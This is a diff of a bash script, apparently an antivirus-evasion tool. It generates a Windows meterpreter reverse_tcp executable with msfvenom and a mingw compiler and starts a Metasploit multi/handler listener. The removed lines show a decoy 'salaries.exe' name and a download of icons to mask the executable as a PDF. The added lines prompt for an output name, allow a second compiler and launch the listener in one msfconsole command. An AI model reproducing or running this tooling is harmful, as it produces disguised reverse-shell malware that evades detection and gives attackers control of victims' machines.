@@ -29,7 +29,6 @@
 # Credit to other A.V. scripts and research by Astr0baby, Vanish3r & Hasan aka inf0g33k
 
 # User options
-OUTPUTNAME="salaries.exe" # The payload exe created name
 PAYLOAD="windows/meterpreter/reverse_tcp" # The payload to use
 MSFVENOM=`which msfvenom` # Path to the msfvenom script
 MSFCONSOLE=`which msfconsole` # Path to the msfconsole script
@@ -69,6 +68,7 @@ spinlong2 ()
 }
 
 clear
+
 echo ""
 echo -e "\e[00;32m##################################################################\e[00m"
 echo ""
@@ -79,15 +79,35 @@ echo ""
 sleep 3
 clear
 
+# Set Output filename
+
+echo ""
+echo -e "\e[1;31m-------------------------------------------------------\e[00m"
+echo -e "\e[01;31m[?]\e[00m Type the Desired Output FileName"
+echo -e "\e[1;31m-------------------------------------------------------\e[00m"
+echo ""
+echo -ne "\e[01;32m>\e[00m "
+read OUTPUTNAME
+echo ""
+
 #Check for gcc compiler
+
 which i586-mingw32msvc-gcc >/dev/null 2>&1
+
 if [ $? -eq 0 ]; then
     echo ""
+    COMPILER="i586-mingw32msvc-gcc"
 else
+    which i686-w64-mingw32-gcc
+    if [ $? -eq 0 ]; then
+        echo ""
+        COMPILER="i686-w64-mingw32-gcc"
+    else
     echo ""
-    echo -e "\e[01;31m[!]\e[00m Unable to find the required gcc program, install i586-mingw32msvc-gcc and try again"
+    echo -e "\e[01;31m[!]\e[00m Unable to find the required gcc program, install i586-mingw32msvc-gcc or i686-w64-mingw32-gcc (Arch) and try again"
     echo ""
     exit 1
+    fi
 fi
 
 #Check for Metasploit
@@ -101,38 +121,6 @@ else
     exit 1
 fi
 
-
-# create a PDF icon
-
-#Check for PDF icon files
-
-ls icons/icon.res >/dev/null 2>&1 && ls icons/autorun.ico >/dev/null 2>&1
-if [ $? -eq 0 ]; then
-    echo ""
-else
-    echo ""
-    echo -e "\e[01;31m[!]\e[00m I can't find the icon files I will need, I will try and download these now"
-    echo ""
-    sleep 2
-    echo ""
-    echo -e "\e[01;32m[-]\e[00m Attempting to download 2 files...please wait"
-    echo ""
-    mkdir icons >/dev/null 2>&1
-    cd icons >/dev/null 2>&1
-    wget http://www.commonexploits.com/tools/avoid/icon.res >/dev/null 2>&1
-    wget http://www.commonexploits.com/tools/avoid/autorun.ico >/dev/null 2>&1
-    sleep 2
-    ls icon.res >/dev/null 2>&1 && ls autorun.ico >/dev/null 2>&1
-    if [ $? -eq 0 ]; then
-        echo -e "\e[01;32m[+]\e[00m Success, icon files downloaded"
-        cd ..
-        echo ""
-    else
-        echo -e "\e[01;31m[!]\e[00m Unable to download the icon files, script will continue but you will not have the masked PDF exe or autorun icon"
-        cd ..
-        echo ""
-    fi
-fi
 
 # Random Msfencode encoding iterations
 #ITER=`seq 5 10 |sort -R |sort -R | head -1`
@@ -153,8 +141,7 @@ read INTEXT
 echo ""
 if [ "$INTEXT" = "1" ]; then
     echo ""
-    IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
-    IP=$(ifconfig "$IPINT" |egrep "inet add?r:" |cut -d ":" -f 2 |awk '{ print $1 }')
+    IP=$(ip route get 1 | awk '{print $NF;exit}')
     echo -e "\e[01;32m[-]\e[00m Local system selected, listener will be launched on \e[01;32m$IP\e[00m using interface \e[01;32m$IPINT\e[00m"
     echo ""
     echo -e "\e[1;31m-------------------------------------------------------\e[00m"
@@ -283,9 +270,9 @@ echo '}' >> build.c
 
 ls icons/icon.res >/dev/null 2>&1
 if [ $? -eq 0 ]; then
-    i586-mingw32msvc-gcc -Wall -mwindows icons/icon.res build.c -o "$OUTPUTNAME"
+    $COMPILER -Wall -mwindows icons/icon.res build.c -o "$OUTPUTNAME"
 else
-    i586-mingw32msvc-gcc -Wall -mwindows build.c -o "$OUTPUTNAME"
+    $COMPILER -Wall -mwindows build.c -o "$OUTPUTNAME"
 fi
 
 # check if file built correctly
@@ -336,12 +323,7 @@ echo ""
 if [ "$INTEXT" = "1" ]; then
     echo -e "\e[01;32m[-]\e[00m Loading the Metasploit listener on \e[01;32m$IP:$PORT\e[00m, please wait..."
     echo ""
-    echo 'use exploit/multi/handler' >> msfhandler.rc
-    echo "set payload $PAYLOAD" >> msfhandler.rc
-    echo "set LHOST $IP" >> msfhandler.rc
-    echo "set LPORT $PORT" >> msfhandler.rc
-    echo 'exploit' >> msfhandler.rc
-    $MSFCONSOLE -r msfhandler.rc
+    $MSFCONSOLE -x "use exploit/multi/handler; set payload $PAYLOAD; set LHOST $IP; set LPORT $PORT; run;"
 else
     echo ""
     echo -e "\e[01;32m[-]\e[00m Use msfhandler.rc as msfconsole resource on your listener system:"
